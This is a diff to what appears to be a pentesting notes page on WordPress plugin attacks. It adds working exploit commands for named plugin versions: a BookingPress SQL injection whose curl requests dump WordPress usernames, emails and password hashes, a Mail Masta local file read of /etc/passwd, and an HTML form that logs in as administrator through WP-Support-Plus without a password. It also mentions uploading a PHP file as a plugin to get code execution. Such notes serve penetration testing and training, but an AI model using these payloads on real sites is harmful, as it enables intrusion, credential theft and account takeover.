@@ -63,9 +63,9 @@ fi
 
 The usage is simple, only do a `chmod +x enumWordPressPlugins.sh` and later \`\`./enumWordpressPlugins.sh
 
-## Plugin RCE
+## Plugin Explotations
 
-### PHP Plugin
+### PHP Plugin to RCE
 
 Depending on the plugin, we can upload a .php file as a plugin.
 
@@ -82,8 +82,46 @@ You will see an error, but if we go to media:
 Access it to see the link:
 
 <figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+## BookingPress < 1.0.11 - Unauthenticated SQL Injection
 
-## Post Explotation
+The plugin fails to properly sanitize user supplied POST data before it is used in a dynamically constructed SQL query via the bookingpress_front_get_category_services AJAX action (available to unauthenticated users), leading to an unauthenticated SQL Injection
+
+You need to search for the ``wponce=<ID>`` in a page, in order to make the exploit work:
+```bash
+curl -i 'https://example.com/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=<ID>&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
+```
+
+To dump users and their passwords:
+
+```bash
+curl -i 'https://example.com/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=<ID>&category_id=33&total_service=-7502) UNION ALL SELECT user_login,user_email,user_pass,NULL,NULL,NULL,NULL,NULL,NULL from wp_users-- -'
+```
+
+## Mail Masta 1.0.0 - Local File Read
+
+We can read files from the machine if this plugin is installed. 
+```bash
+curl -s -X GET "http://<IP>/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
+```
+
+## WP-Support-Plus-Responsive Ticket System < 7.1.3 - Privilege Escalation
+
+You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie().
+
+You need to know at least one username.
+
+```txt
+<form method="post" action="http://<IP>/wp-admin/admin-ajax.php">
+	Username: <input type="text" name="username" value="administrator">
+	<input type="hidden" name="email" value="sth">
+	<input type="hidden" name="action" value="loginGuestFacebook">
+	<input type="submit" value="Login">
+</form>
+```
+
+Then you need to enable a SimpleHTTPServer to exploit.
+
+# Post Explotation
 
 If we can see the username and password of MySQL database, we can use this command to extract usernames and passwords
 
